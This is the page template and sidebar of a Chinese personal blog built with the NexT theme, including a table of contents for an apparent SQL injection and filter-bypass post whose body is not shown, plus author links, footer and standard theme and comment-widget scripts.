href="#%E8%AE%BE%E7%BD%AE%E6%98%BE%E7%A4%BA%E4%BF%A1%E6%81%AF%E7%9A%84%E8%AF%A6%E7%BB%86%E5%BA%A6%EF%BC%9A"><span class="nav-number">7.</span> <span class="nav-text">设置显示信息的详细度：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E6%96%B9%E5%BC%8F"><span class="nav-number">8.</span> <span class="nav-text">获取目标方式</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%AF%B7%E6%B1%82"><span class="nav-number">9.</span> <span class="nav-text">请求</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5"><span class="nav-number">10.</span> <span class="nav-text">注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8E%A2%E6%B5%8B"><span class="nav-number">11.</span> <span class="nav-text">探测</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF"><span class="nav-number">12.</span> <span class="nav-text">注入技术</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%88%86%E7%A0%B4"><span class="nav-number">13.</span> <span class="nav-text">爆破</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%92%88%E5%AF%B9%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E7%9A%84%EF%BC%9A"><span class="nav-number">14.</span> <span class="nav-text">针对过滤空格的：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%92%88%E5%AF%B9%E8%BF%87%E6%BB%A4%E5%BC%95%E5%8F%B7%E7%9A%84%EF%BC%9A"><span class="nav-number">15.</span> <span class="nav-text">针对过滤引号的：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%92%88%E5%AF%B9%E8%BF%87%E6%BB%A4%E5%85%B3%E9%94%AE%E5%AD%97%E7%9A%84%EF%BC%9A"><span class="nav-number">16.</span> <span class="nav-text">针对过滤关键字的：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%92%88%E5%AF%B9%E8%BF%87%E6%BB%A4%E6%AF%94%E8%BE%83%E7%AC%A6%E5%8F%B7%E7%9A%84%EF%BC%9A"><span class="nav-number">17.</span> <span class="nav-text">针对过滤比较符号的：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E7%B1%BB%E5%9E%8B%EF%BC%9A"><span class="nav-number">18.</span> <span class="nav-text">其他类型：</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="安小琪"
+      src="/images/header.jpg">
+  <p class="site-author-name" itemprop="name">安小琪</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">101</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/npfs06" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;npfs06" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:npfs066@gmail.com" title="E-Mail → mailto:npfs066@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://hyluz.cn/" title="https:&#x2F;&#x2F;hyluz.cn&#x2F;" rel="noopener" target="_blank">Luz</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://0clickjacking0.github.io/" title="https:&#x2F;&#x2F;0clickjacking0.github.io&#x2F;" rel="noopener" target="_blank">xianyu123</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://jiang-niao.github.io/" title="https:&#x2F;&#x2F;jiang-niao.github.io&#x2F;" rel="noopener" target="_blank">JiangNiao</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://xiaolong22333.top/" title="https:&#x2F;&#x2F;xiaolong22333.top&#x2F;" rel="noopener" target="_blank">xiaolong</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+
+
+<!--
+ <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+-->
+
+
+  <span class="author" itemprop="copyrightHolder">安小琪</span>
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">浙ICP备2020030100号 </a>
+  </div>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+<script>
+document.querySelectorAll('.pdfobject-container').forEach(element => {
+  let url = element.dataset.target;
+  let pdfOpenParams = {
+    navpanes : 0,
+    toolbar  : 0,
+    statusbar: 0,
+    pagemode : 'thumbs',
+    view     : 'FitH'
+  };
+  let pdfOpenFragment = '#' + Object.entries(pdfOpenParams).map(([key, value]) => `${key}=${encodeURIComponent(value)}`).join('&');
+  let fullURL = `/lib/pdf/web/viewer.html?file=${encodeURIComponent(url)}${pdfOpenFragment}`;
+
+  if (NexT.utils.supportsPDFs()) {
+    element.innerHTML = `<embed class="pdfobject" src="${url + pdfOpenFragment}" type="application/pdf" style="height: ${element.dataset.height};">`;
+  } else {
+    element.innerHTML = `<iframe src="${fullURL}" style="height: ${element.dataset.height};" frameborder="0"></iframe>`;
+  }
+});
+</script>
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'nhITwFwMLqOi81E1nOPXx9Iw-MdYXbMMI',
+      appKey     : 'F9l5INUqgwxvbJOfC1X7OMnr',
+      placeholder: "欢迎在这里留言！我看到一定会及时回复的噢 （PS：回复信息会自动发送到你所填写的邮箱噢）",
+      avatar     : '',
+      meta       : guest,
+      pageSize   : '6' || 10,
+      visitor    : false,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
